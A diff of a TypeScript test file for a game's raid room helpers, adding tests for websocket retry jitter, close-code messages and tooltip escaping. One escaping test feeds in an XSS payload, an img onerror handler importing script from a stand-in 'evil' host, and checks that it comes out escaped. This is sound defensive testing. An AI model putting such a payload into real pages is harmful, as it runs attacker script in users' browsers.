@@ -21,6 +21,7 @@ import {
   markMatchesFloor,
   markStrokePoints,
   isMapDrawTool,
+  markAuthorTooltipHtml,
   normalizeMarkLabel,
   shouldRightButtonPanMap,
   mergeBoardMarks,
@@ -51,6 +52,7 @@ import {
   defaultRaidRoomTitle,
   raidRoomJoinNeedsPassword,
   RAID_ROOM_WS_PING_MS,
+  raidRoomWsCloseReason,
   raidRoomWsRetryDelayMs,
   remainMs,
   roomDisplayTitle,
@@ -451,8 +453,8 @@ describe("raid room helpers", () => {
       { public_id: "1", member_count: 0 },
       { public_id: "2", member_count: 0 },
     ]);
-    expect(raidRoomWsRetryDelayMs(0)).toBe(1000);
-    expect(raidRoomWsRetryDelayMs(5)).toBe(30_000);
+    expect(raidRoomWsRetryDelayMs(0, () => 0.5)).toBe(1000);
+    expect(raidRoomWsRetryDelayMs(5, () => 0.5)).toBe(30_000);
     expect(RAID_ROOM_WS_PING_MS).toBe(25_000);
     expect(
       roomDisplayTitle({ title: "", host_display_name: "甲" }, "海关"),
@@ -460,6 +462,29 @@ describe("raid room helpers", () => {
     expect(
       roomDisplayTitle({ title: "夜厂局", host_display_name: "甲" }, "海关"),
     ).toBe("夜厂局");
+  });
+
+  it("jitters ws backoff by ±25% around the capped base", () => {
+    expect(raidRoomWsRetryDelayMs(0, () => 0)).toBe(750);
+    expect(raidRoomWsRetryDelayMs(0, () => 1)).toBe(1250);
+    expect(raidRoomWsRetryDelayMs(3, () => 0)).toBe(6000);
+    expect(raidRoomWsRetryDelayMs(20, () => 0)).toBe(22_500);
+    expect(raidRoomWsRetryDelayMs(20, () => 1)).toBe(37_500);
+    expect(raidRoomWsRetryDelayMs(Number.NaN, () => 0.5)).toBe(1000);
+    for (let i = 0; i < 50; i += 1) {
+      const delay = raidRoomWsRetryDelayMs(2);
+      expect(delay).toBeGreaterThanOrEqual(3000);
+      expect(delay).toBeLessThanOrEqual(5000);
+    }
+  });
+
+  it("stops ws retries only on terminal close codes", () => {
+    expect(raidRoomWsCloseReason(4401)).toContain("登录");
+    expect(raidRoomWsCloseReason(4403)).toContain("拒绝");
+    expect(raidRoomWsCloseReason(4404)).toContain("解散");
+    for (const code of [1000, 1001, 1006, 1009, 1011, 1012, 4000]) {
+      expect(raidRoomWsCloseReason(code)).toBeNull();
+    }
   });
 
   it("returns 回到房间 href only when seated elsewhere", () => {
@@ -877,6 +902,20 @@ describe("raid room helpers", () => {
     expect(shouldRightButtonPanMap("pen")).toBe(true);
     expect(shouldRightButtonPanMap("text")).toBe(true);
     expect(shouldRightButtonPanMap("erase")).toBe(true);
+  });
+
+  it("escapes mark author names before Leaflet writes them as tooltip HTML", () => {
+    expect(
+      markAuthorTooltipHtml({
+        author_display_name: `<img src=x onerror="import('//evil/x.js')">`,
+      }),
+    ).toBe(
+      "&lt;img src=x onerror=&quot;import(&#39;//evil/x.js&#39;)&quot;&gt;",
+    );
+    expect(markAuthorTooltipHtml({ author_display_name: " 老王 " })).toBe(
+      "老王",
+    );
+    expect(markAuthorTooltipHtml({})).toBe("");
   });
 
   it("normalizes map text and keeps two labels distinct", () => {
